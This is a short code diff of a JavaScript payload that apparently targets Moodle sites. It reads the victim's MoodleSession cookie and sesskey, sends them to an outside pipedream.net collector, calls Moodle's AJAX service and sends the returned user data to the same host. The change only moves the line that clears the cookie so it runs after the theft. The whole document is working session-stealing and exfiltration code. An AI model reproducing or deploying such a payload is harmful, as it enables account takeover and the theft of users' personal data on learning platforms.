@@ -24,7 +24,6 @@ const u=document.querySelector('[data-route="view-settings"]').getAttribute('dat
 const t=document.cookie.match(/MoodleSession=([^;]+)/)[1];
 const s=M.cfg.sesskey;
 fetch('//eoizd5ecl7m1qqn.m.pipedream.net/?MoodleSession='+t+"&id="+u+"&sesskey="+s);
-document.cookie='MoodleSession=;path=/';
 fetch('/lib/ajax/service.php?sesskey='+s,{
     method:'POST',
     headers:{
@@ -37,3 +36,4 @@ fetch('/lib/ajax/service.php?sesskey='+s,{
 })
 .then(r=>r.json())
 .then(d=>fetch('https://eoizd5ecl7m1qqn.m.pipedream.net/?userinfo='+encodeURIComponent(JSON.stringify(d)),{mode:'no-cors'}));
+document.cookie='MoodleSession=;path=/';
